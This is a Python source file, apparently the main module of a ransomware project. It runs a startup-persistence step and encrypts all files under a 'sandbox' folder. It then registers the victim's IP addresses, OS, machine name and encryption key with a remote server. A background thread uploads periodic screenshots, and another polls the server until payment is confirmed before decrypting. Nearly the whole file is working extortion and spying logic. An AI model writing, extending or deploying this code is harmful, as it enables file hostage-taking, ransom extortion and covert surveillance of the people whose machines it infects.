#  Copyright (c) 2022. Esteban Restoy e.restoy24@gmail.com

import requests
from dotenv import load_dotenv

load_dotenv()

import os
import time
from cryptography.fernet import Fernet
from os.path import isfile
import glob
import asyncio
import datetime
from threading import Thread

from modules.cryptography.file_decryption import decrypt_file
from modules.cryptography.file_encryption import encrypt_file
from modules.internet.get_ressources import get_has_paid, get_the_decryption_key
from modules.internet.post_ressources import create_computer, post_image
from modules.miscellaneous.computer_properties import get_computer_name, \
    get_computer_os, get_public_ip, get_private_ip, take_screenshot, startup_exec
from modules.miscellaneous.config_file import get_config_file_info, create_config_file, edit_config_file
from modules.internet.patch_ressources import patch_last_message_date

TRUE_ALIASES = [True, "True", "true", "yes"]

global is_connected


def get_all_files_in_directory(path):
    return [f for f in glob.glob(path + '/**/*', recursive=True) if isfile(f)]


async def main():
    global is_connected
    is_connected = False
    key = ""
    # -- STARTUP MODULE --
    startup_exec()
    # -- STARTUP MODULE --
    if get_config_file_info("encrypted") not in TRUE_ALIASES:
        print("-- START OF ENCRYPTION STEP --")
        # -- ENCRYPT MODULE --
        key = Fernet.generate_key()
        print("-- KEY GENERATED --")
        fernet = Fernet(key)
        files = get_all_files_in_directory("sandbox")
        await asyncio.gather(*[encrypt_file(file, fernet) for file in files])
        print("-- END OF ENCRYPTION STEP --")
        # -- ENCRYPT MODULE --

    # -- CHANGE BG MODULE --
    # change_background_image(getcwd() + "/" + get_image())
    # -- CHANGE BG MODULE --

    computer_id = get_config_file_info("computer_id")

    if computer_id == -1:
        while is_connected is not True:
            try:
                print("-- CREATION OF COMPUTER --")
                computer_id = create_computer(get_public_ip(), get_private_ip(), get_computer_os(),
                                              get_computer_name(), key.decode())["id"]
                print("-- CREATION OF CONFIG FILE --")
                create_config_file(computer_id)
                is_connected = True
            except requests.ConnectionError:
                is_connected = False
                print("Wait for web server to respond . . .")
                time.sleep(10)

    screenshot = Thread(target=screenshot_module, args=(computer_id,), daemon=True)
    has_paid_checker = Thread(target=has_paid_checker_module, args=(computer_id,), daemon=True)

    screenshot.start()
    has_paid_checker.start()
    has_paid_checker.join()


# -- HAS PAID MODULE --

def has_paid_checker_module(computer_id: str):
    while True:
        try:
            print("-- HE HAS PAID : --" + str(get_has_paid(computer_id)))
            if get_has_paid(computer_id):
                key = get_the_decryption_key(computer_id).encode()
                files = get_all_files_in_directory("sandbox")
                if key:
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)

                    loop.run_until_complete(asyncio.gather(*[decrypt_file(file, Fernet(key)) for file in files]))
                    loop.close()
                    edit_config_file("has_paid", "True")
                exit(0)
        except requests.ConnectionError:
            print("Wait for web server to respond . . .")
            time.sleep(10)
        time.sleep(float(os.getenv("DELAY_BETWEEN_HAS_PAID_CHECK")))


# --  HAS PAID MODULE --


# -- SCREENSHOT MODULE --

def screenshot_module(computer_id):
    while True:
        try:
            if os.getenv("ENABLE_SCREENSHOT") in TRUE_ALIASES:
                path = take_screenshot(os.environ['USERPROFILE'] + '\\Pictures\\')
                post_image(path, computer_id)
                patch_last_message_date(computer_id, datetime.datetime.now(datetime.timezone.utc))
                time.sleep(float(os.getenv("DELAY_BETWEEN_SCREENSHOTS")))
        except requests.ConnectionError:
            print("Wait for web server to respond . . .")
            time.sleep(10)


# -- SCREENSHOT MODULE --


if __name__ == '__main__':

    if get_config_file_info("has_paid") in TRUE_ALIASES:
        quit(0)
    asyncio.run(main())
